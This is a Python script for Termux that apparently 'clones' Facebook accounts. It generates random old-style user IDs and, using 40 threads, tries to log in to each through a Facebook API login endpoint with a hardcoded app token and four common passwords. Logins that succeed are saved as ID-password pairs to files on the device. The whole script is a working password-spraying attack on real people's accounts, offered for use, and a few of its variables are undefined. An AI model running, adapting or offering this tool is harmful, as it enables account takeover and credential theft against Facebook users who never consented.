import random
import requests
import sys
import time
import datetime
from datetime import datetime
from datetime import date
import os
from concurrent.futures import ThreadPoolExecutor as ThreadPool
sys.stdout.write('\x1b]2; 𓆩🀪💚【AXL】㊝𓆪 🔥 \x07')
# Function to request storage permissions in Termux
def request_storage_permission():
    try:
        open('/sdcard/@AXLTERMUX', 'w').write(' ')
    except Exception as e:
        print(e)
        print('\033[1;93m Allow Termux Permissions! And Run Again ')
        os.system('termux-setup-storage')


directories = [
    '/sdcard/AXL',
    '/sdcard/TERMUX-AXL', 
    '/sdcard/AXL/ALEXANDER-TERMUX-AXL'
]

# Create each directory in the list
for folder_path in directories:
    try:
        os.makedirs(folder_path, exist_ok=True)
    except Exception as e:
        print(f"An error occurred while creating {folder_path}: {e}")
        
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('/sdcard/.proxy.txt','w').write(prox)
except Exception as e:
 print('')
 prox=open('/sdcard/.proxy.txt','r').read().splitlines()
 

successfull=[]
G="\033[1;92m"
W="\033[0;97m"
Y="\033[1;93m"
B="\033[1;90m"
a=f"{G}➤{W}➤"
ax1=f"{G}•{W}•"
ax=f"{G}━{W}➤"
axl=f"{B}[{G}━{W}]"
op1=f"{W}|{G}1{W}|"
op2=f"{W}|{G}2{W}|"
op0=f"{W}|{G}0{W}|"
ch=f"{W}|{G}?{W}|"

def line():
	print(f'{W}───────────────────────────────────────────────')



# Get current date and time
_month_ = {'1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June', '7': 'July', '8': 'August', '9': 'September', '10': 'October', '11': 'November', '12': 'December'}
date = datetime.now().day
month = _month_[(str(datetime.now().month))]
year = datetime.now().year
date_and_year = (str(date) + '\033[1;90m-\033[1;92m' + str(month) + '\033[1;90m-\033[1;92m' + str(year))

# -------------(MAIN LOGO)--------------
def Banner():
    os.system('clear' if 'Linux' in sys.platform.capitalize() else 'cls')
    return f'''\033[1;97m            d8888 Y88b   d88P 888   
           d88888  Y88b d88P  888      
          d88P888   Y88o88P   888      
         \033[1;92md88P 888    Y888P    888      
        d88P  888    d888b    888\033[1;97m
       d88P   888   d88888b   888      
      d8888888888  d88P Y88b  888       
     d88P     888 d88P   Y88b 88888888\033[0;97m  
\033[0;97m───────────────────────────────────────────────
{ax} AUTHOR   {ax} ALEXANDER AXL MONTREAL
\033[0;97m───────────────────────────────────────────────
{ax} FACEBOOK {ax} AlexanderAxlMontreal.IAmLimitless
\033[0;97m───────────────────────────────────────────────
{ax} ABOUT    {ax} https://bio.link/axl_termux
\033[0;97m───────────────────────────────────────────────'''


# -------------(CHECK ID CREATION YEAR)--------------
def creationyear(uid):
    if len(uid) == 15:
        if uid[:10] in ['1000000000']:
            axl_termux = '2009'
        elif uid[:9] in ['100000000']:
            axl_termux = '2009'
        elif uid[:8] in ['10000000']:
            axl_termux = '2009'
        elif uid[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            axl_termux = '2009'
        elif uid[:7] in ['1000006', '1000007', '1000008', '1000009']:
            axl_termux = '2010'
        elif uid[:6] in ['100001']:
            axl_termux = '2010'
        elif uid[:6] in ['100002', '100003']:
            axl_termux = '2011'
        elif uid[:6] in ['100004']:
            axl_termux = '2012'
        elif uid[:6] in ['100005', '100006']:
            axl_termux = '2013'
        elif uid[:6] in ['100007', '100008']:
            axl_termux = '2014'
        elif uid[:6] in ['100009']:
            axl_termux = '2015'
        elif uid[:5] in ['10001']:
            axl_termux = '2016'
        elif uid[:5] in ['10002']:
            axl_termux = '2017'
        elif uid[:5] in ['10003']:
            axl_termux = '2018'
        elif uid[:5] in ['10004']:
            axl_termux = '2019'
        elif uid[:5] in ['10005']:
            axl_termux = '2020'
        elif uid[:5] in ['10006']:
            axl_termux = '2021'
        elif uid[:5] in ['10009']:
            axl_termux = '2023'
        elif uid[:5] in ['10007', '10008']:
            axl_termux = '2022'
        else:
            axl_termux = ''
    elif len(uid) in [9, 10]:
        axl_termux = '2008'
    elif len(uid) == 8:
        axl_termux = '2007'
    elif len(uid) == 7:
        axl_termux = '2006'
    elif len(uid) == 14 and uid[:2] in ['61']:
        axl_termux = '2024'
    else:
        axl_termux = ''
    return axl_termux

def generate_user_agent():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    rx = random.randrange(1, 999)
    return (f"Mozilla/5.0 (Windows NT {rr(9,11)}; Win64; x64){aZ}{rx}{aZ}) "
            f"AppleWebKit/537.36 (KHTML, like Gecko){rr(99,149)}.0.{rr(4500,4999)}.{rr(35,99)} "
            f"Chrome/{rr(99,175)}.0.{rr(0,5)}.{rr(0,5)} Safari/537.36")

def generate_user_ids(star, limit=None):
    if limit:
        return [str(random.randint(111111111, 999999999)) for _ in range(limit)]
    return [str(random.randint(111111111, 999999999)) for _ in range(1000)]  # Default limit

def login(uid):
    session = requests.Session()
    global successfull
    try:
        for pw in ["123456", "1234567", "12345678", "123456789"]:
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), 
                "x-fb-sim-hni": str(random.randint(20000, 40000)), 
                "x-fb-net-hni": str(random.randint(20000, 40000)), 
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": generate_user_agent(), 
                "content-type": "application/x-www-form-urlencoded", 
                "x-fb-http-engine": "Liger"
            }
            response = session.get(
                "https://b-api.facebook.com/method/auth.login",
                params={
                    "format": "json",
                    "email": uid,
                    "password": pw,
                    "credentials_type": "device_based_login_password",
                    "generate_session_cookies": "1",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "meta_inf_fbmeta": "%20¤tly_logged_in_userid=0",
                    "method": "GET",
                    "locale": "en_US",
                    "client_country_code": "US",
                    "fb_api_caller_class": "com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler",
                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "fb_api_req_friendly_name": "authenticate",
                    "cpl": "true"
                },
                headers=headers
            ).json()
            if "session_key" in response or "EAAA" in str(response):
            	with open("/sdcard/axl_old.txt", "a") as file:
                    file.write(f"[SUCCESSFULLY-OK] {uid}|{pw}|{creationyear(uid)}");line()
            	print(f"\r{xy1}{G} [SUCCESSFULLY-OK] {uid} | {pw} | {creationyear(uid)}")
            	ProfileLink=f"https://www.facebook.com/profile.php?id={uid}"
            	print(f"\r{x}{G} PROFILE LINK {G}➤{W} {ProfileLink}");line()
            	open(f'/sdcard/AXL/OLD-UID/axl_old_uid_ok.txt', 'a').write(f'[YOUNIS-OK] {uid} | {pw} | {creationyear(uid)}\n')
            	successfull.append("%s|%s"%(uid, pw))
            	break            
            elif "session_key" in response or "Please Confirm Email" in str(response):
                with open("/sdcard/axl_old.txt", "a") as file:
                    file.write(f"[SUCCESSFULLY-OK] {uid}|{pw}|{creationyear(uid)}\n")
                print(f"\r{xy1}{G} [SUCCESSFULLY-OK] {uid} | {pw} | {creationyear(uid)}")
                ProfileLink=f"https://www.facebook.com/profile.php?id={uid}"
                print(f"\r{xy1}{G} PROFILE LINK {G}➤{W} {ProfileLink}");line()
                successfull.append("%s|%s"%(uid, pw))
                return
        sys.stdout.write(f"\r\033[0;97m[\033[1;92m{date_and_year}\033[0;97m] \x1b[38;5;208m{uid}{W}|{G}{len(successfull)}{W} ")
    except Exception as e:
        #print(f"\nError: {e}")
        time.sleep(5)  # Shorter sleep


def main():
    print(Banner())
    print(f'{op1} CLONE 2011-2015')
    print(f'{op2} CLONE 2009-2010')
    print(f'{op0} {G}CONTACT DEVELOPER')
    line()
    choice = input(f'{ch} SELECT : ')
    print(Banner())
    AxllTerumx = "10000" if choice in ['1', '01'] else "100000"
    if AxllTerumx == "100000":
        print(f"{ax} EXAMPLE {G}:{W} 1000 {G}|{W} 2000 {G}|{W} 5000 {G}|{W} 10000")
        line()
        limit = int(input(f'{ch} LIMIT {G}:{W} '))
        user_ids = generate_user_ids(AxllTerumx, limit)
    else:
        user_ids = generate_user_ids(AxllTerumx)
    print(Banner())
    print(f"{ax} OK/CP IDS WILL BE SAVED IN {ax} /SDCARD");line()
    print(f'{ax} TOTAL UID {ax} {len(user_ids)}')
    line()
    with ThreadPool(max_workers=40) as pool:
        pool.map(login, [AxllTerumx + uid for uid in user_ids])
    print()
    line()
    print(f"{ax} PROGRAM FINISHED.")
    print(f'{ax} TOTAL OK: '+str(len(successfull))+'/'+str(len(successfull)))
    line()
    input(" [ PRESS ENTER TO BACK ]") 
    main()
    
    
    
if __name__ == "__main__":
    main()
